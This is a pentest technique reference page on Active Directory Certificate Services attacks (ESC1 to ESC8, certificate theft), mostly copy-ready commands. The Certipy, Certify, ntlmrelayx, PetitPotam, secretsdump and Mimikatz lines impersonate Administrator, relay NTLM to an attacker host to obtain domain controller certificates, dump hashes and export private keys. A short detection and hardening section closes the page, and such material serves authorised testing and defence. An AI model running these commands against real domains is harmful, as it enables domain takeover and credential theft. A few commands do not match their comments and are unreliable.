---
title: Active Directory Certificate Services (AD CS) Attacks
category: techniques
subcategory: active-directory
tags: [adcs, certificates, esc1, esc2, esc3, esc4, esc5, esc6, esc7, esc8, certipy]
last_updated: 2025-12-27
---

# Active Directory Certificate Services (AD CS) Attacks

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [ESC1 - Template Misconfiguration (SAN)](#esc1---template-misconfiguration-san)
- [ESC2 - Any Purpose EKU](#esc2---any-purpose-eku)
- [ESC3 - Enrollment Agent Abuse](#esc3---enrollment-agent-abuse)
- [ESC4 - Template ACL Misconfiguration](#esc4---template-acl-misconfiguration)
- [ESC5 - PKI Object ACL Abuse](#esc5---pki-object-acl-abuse)
- [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6---editf_attributesubjectaltname2)
- [ESC7 - CA Permissions](#esc7---ca-permissions)
- [ESC8 - NTLM Relay to HTTP Endpoint](#esc8---ntlm-relay-to-http-endpoint)
- [Certificate Theft](#certificate-theft)
- [Detection and Defense](#detection-and-defense)
- [References](#references)

## Overview

Active Directory Certificate Services (AD CS) provides PKI functionality for enterprises. Misconfigurations in certificate templates and CA settings create privilege escalation paths to Domain Admin.

**Key Concepts:**
- **Certificate Templates**: Define certificate properties and who can enroll
- **Certificate Authority (CA)**: Issues certificates based on templates
- **EKU (Extended Key Usage)**: Defines what certificates can be used for
- **SAN (Subject Alternative Name)**: Alternative identities in certificate

### Common Tools

| Tool | Description |
|------|-------------|
| Certipy | Python AD CS enumeration and exploitation |
| Certify | C# AD CS enumeration and exploitation |
| ForgeCert | Forge certificates with stolen CA keys |
| PassTheCert | Authenticate using certificates |

---

## Enumeration

### Certipy (Recommended)

```bash
# Find all vulnerable templates
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable

# Full enumeration
certipy find -u user@domain.local -p password -dc-ip DC_IP -old-bloodhound

# Output to file
certipy find -u user@domain.local -p password -dc-ip DC_IP -output certipy_results
```

### Certify

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# All certificate templates
.\Certify.exe find

# CA information
.\Certify.exe cas
```

### Manual Enumeration

```powershell
# Find CAs
certutil -config - -ping

# List templates
certutil -TCAInfo

# PowerShell - Get templates
Get-ADObject -LDAPFilter '(objectClass=pKICertificateTemplate)' -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local'
```

---

## ESC1 - Template Misconfiguration (SAN)

### Description

ESC1 allows specifying arbitrary Subject Alternative Names (SANs) in certificate requests. This enables impersonating any user, including Domain Admins.

### Vulnerable Conditions

1. Low-privileged users can enroll (Enroll permission)
2. Manager Approval is disabled
3. No authorized signatures required
4. Template has `ENROLLEE_SUPPLIES_SUBJECT` flag (allows SAN specification)
5. Template allows Client Authentication or Smart Card Logon

### Exploitation

```bash
# Certipy - Request certificate as Administrator
certipy req -u user@domain.local -p password -ca 'CA-NAME' -target CA_IP -template 'VulnerableTemplate' -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

```powershell
# Certify
.\Certify.exe request /ca:CA-NAME\CA /template:VulnerableTemplate /altname:administrator
```

### Using the Certificate

```bash
# Get TGT with certificate (Certipy)
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Get NT hash from certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Pass the Cert
passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip DC_IP
```

---

## ESC2 - Any Purpose EKU

### Description

Templates with "Any Purpose" EKU or no EKU specified can be used for any purpose, including client authentication and certificate request agent functions.

### Vulnerable Conditions

1. Low-privileged users can enroll
2. Manager Approval disabled, no signatures required
3. Template has "Any Purpose" EKU (OID 2.5.29.37.0) or no EKU

### Exploitation

```bash
# Request certificate
certipy req -u user@domain.local -p password -ca 'CA-NAME' -target CA_IP -template 'AnyPurposeTemplate'

# Use as enrollment agent (combine with ESC3)
certipy req -u user@domain.local -p password -ca 'CA-NAME' -target CA_IP -template 'User' -on-behalf-of 'DOMAIN\Administrator' -pfx any_purpose.pfx
```

---

## ESC3 - Enrollment Agent Abuse

### Description

ESC3 involves templates that grant Certificate Request Agent (Enrollment Agent) capabilities. These can be used to request certificates on behalf of other users.

### Vulnerable Conditions

**Condition 1 - Enrollment Agent Template:**
1. Low-privileged users can enroll
2. Template has Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1)
3. No enrollment agent restrictions on CA

**Condition 2 - Target Template:**
1. Template allows enrollment agents to enroll on behalf of others
2. Application Policy includes authentication EKU

### Exploitation

```bash
# Step 1: Get Enrollment Agent certificate
certipy req -u user@domain.local -p password -ca 'CA-NAME' -target CA_IP -template 'EnrollmentAgent'

# Step 2: Request certificate as another user
certipy req -u user@domain.local -p password -ca 'CA-NAME' -target CA_IP -template 'User' -on-behalf-of 'DOMAIN\Administrator' -pfx enrollment_agent.pfx

# Step 3: Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC4 - Template ACL Misconfiguration

### Description

ESC4 exploits write permissions on certificate templates. If you can modify a template, you can make it vulnerable to ESC1 or other attacks.

### Vulnerable Conditions

1. User has write permissions on template (WriteProperty, WriteDacl, WriteOwner, GenericAll)
2. Template can be enrolled by the user (or made enrollable)

### Exploitation

```bash
# Certipy - Modify template to be vulnerable
certipy template -u user@domain.local -p password -template VulnerableTemplate -save-old

# Now exploit as ESC1
certipy req -u user@domain.local -p password -ca 'CA-NAME' -target CA_IP -template VulnerableTemplate -upn administrator@domain.local

# Restore original template
certipy template -u user@domain.local -p password -template VulnerableTemplate -configuration VulnerableTemplate.json
```

```powershell
# Manual modification - Set ENROLLEE_SUPPLIES_SUBJECT
$templateDN = "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
Set-ADObject -Identity $templateDN -Replace @{'msPKI-Certificate-Name-Flag'=1}
```

---

## ESC5 - PKI Object ACL Abuse

### Description

ESC5 exploits write permissions on PKI infrastructure objects in AD, such as the CA object or the NTAuthCertificates container.

### Vulnerable Conditions

1. Write access to PKI objects (CA server AD object, NTAuthCertificates)
2. Ability to modify certificate trust or CA configurations

### Exploitation

```bash
# Modify CA object (requires write permissions)
# This is similar to ESC7 but targets different objects

# If you can add to NTAuthCertificates:
# You can add a rogue CA certificate and issue trusted certificates
```

---

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

### Description

When the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is enabled on the CA, any template becomes vulnerable to SAN specification attacks (similar to ESC1).

### Checking the Flag

```powershell
# Check CA configuration
certutil -config "CA-NAME" -getreg "policy\EditFlags"

# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)
```

### Exploitation

```bash
# Any template can now accept SAN
certipy req -u user@domain.local -p password -ca 'CA-NAME' -target CA_IP -template 'User' -upn administrator@domain.local

certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC7 - CA Permissions

### Description

ESC7 exploits excessive permissions on the CA itself. With `ManageCA` permission, you can enable ESC6. With `ManageCertificates`, you can approve pending requests.

### Vulnerable Conditions

**ESC7a - ManageCA:**
- User has ManageCA permission
- Can modify CA configuration (enable ESC6 flag)

**ESC7b - ManageCertificates:**
- User has ManageCertificates permission
- Can approve pending certificate requests

### Exploitation - ESC7a (ManageCA)

```bash
# Enable EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -ca 'CA-NAME' -add-officer user -u user@domain.local -p password

# Now exploit like ESC6
certipy req -u user@domain.local -p password -ca 'CA-NAME' -template 'SubCA' -upn administrator@domain.local
```

### Exploitation - ESC7b (ManageCertificates)

```bash
# Request certificate (will be pending)
certipy req -u user@domain.local -p password -ca 'CA-NAME' -template 'User' -upn administrator@domain.local

# Issue the pending request
certipy ca -ca 'CA-NAME' -issue-request <request-id> -u user@domain.local -p password

# Retrieve the certificate
certipy req -u user@domain.local -p password -ca 'CA-NAME' -retrieve <request-id>
```

---

## ESC8 - NTLM Relay to HTTP Endpoint

### Description

ESC8 exploits the AD CS web enrollment interface, which accepts NTLM authentication. Relaying NTLM authentication to this endpoint allows requesting certificates as the relayed user.

### Prerequisites

- Web Enrollment role installed on CA
- HTTP endpoint accessible
- Ability to trigger NTLM authentication (Responder, PetitPotam, etc.)

### Exploitation

```bash
# Terminal 1: Start NTLM relay to AD CS
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Trigger authentication (PetitPotam to DC)
python3 PetitPotam.py ATTACKER_IP DC_IP

# OR use Responder/other coercion methods

# Once certificate is obtained:
certipy auth -pfx dc01.pfx -dc-ip DC_IP
```

### Target Machine Account Certificates

```bash
# Relay DC machine account to get DC certificate
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Use certificate for DCSync
certipy auth -pfx dc01.pfx -dc-ip DC_IP
secretsdump.py -k -no-pass domain.local/dc01\$@DC01
```

---

## Certificate Theft

### Description

Stealing existing certificates and private keys allows persistent authentication.

### DPAPI Certificate Extraction

```
# Mimikatz - Export certificates
crypto::capi
crypto::cng
crypto::certificates /export /systemstore:local_machine

# Export with private keys
crypto::certificates /export /systemstore:local_machine /export
```

### PKINIT and Shadow Credentials

```bash
# Add Shadow Credentials (requires write to msDS-KeyCredentialLink)
certipy shadow auto -u user@domain.local -p password -account targetuser

# Use the certificate
certipy auth -pfx targetuser.pfx -dc-ip DC_IP
```

### Certificate Persistence

```bash
# Request certificate for current user (legitimate)
certipy req -u admin@domain.local -p password -ca 'CA-NAME' -template 'User'

# Certificate valid for template lifetime (typically 1 year)
# Can authenticate without knowing password
certipy auth -pfx admin.pfx -dc-ip DC_IP
```

---

## Additional ESC Vulnerabilities

### ESC9 - No Security Extension

Template without security extension allows SAN abuse in specific configurations.

### ESC10 - Weak Certificate Mappings

Weak certificate-to-account mappings allow impersonation.

### ESC11 - NTLM Relay to ICPR

Relay to the ICPR RPC interface.

### ESC13 - OID Group Link Abuse

Abuse of issuance policies linked to universal groups.

### ESC15 (CVE-2024-49019)

Arbitrary application policy vulnerabilities in certificate requests.

---

## Detection and Defense

### Detection

| Vulnerability | Detection Method |
|--------------|-----------------|
| ESC1-ESC7 | Template configuration auditing |
| ESC8 | Monitor certificate requests from unexpected sources |
| Certificate Theft | Monitor crypto API usage, certificate exports |
| All | Event ID 4887 (certificate issued), 4886 (request received) |

### Key Event IDs

| Event ID | Description |
|----------|-------------|
| 4886 | Certificate Services received a certificate request |
| 4887 | Certificate Services approved and issued a certificate |
| 4888 | Certificate Services denied a certificate request |

### Defensive Measures

**Template Hardening:**
```powershell
# Disable ENROLLEE_SUPPLIES_SUBJECT
# Remove Manager Approval bypass
# Require authorized signatures
# Limit enrollment permissions
```

**CA Hardening:**
```powershell
# Disable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "CA-NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Enable enrollment agent restrictions
# Audit ManageCA and ManageCertificates permissions
```

**HTTP Endpoint:**
- Disable web enrollment if not needed
- Require EPA (Extended Protection for Authentication)
- Enable HTTPS only

**Monitoring:**
- Audit all certificate requests
- Alert on certificates for privileged users
- Monitor template modifications
- Track certificate enrollment patterns

---

## References

- [SpecterOps - Certified Pre-Owned Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [HackTricks - AD CS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates)
- [Metasploit AD CS Module](https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html)
- [NCC Group - ADCS Defense Guide](https://www.nccgroup.com/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/)
- [AD CS Security Reference](https://www.adcs-security.com/attacks)
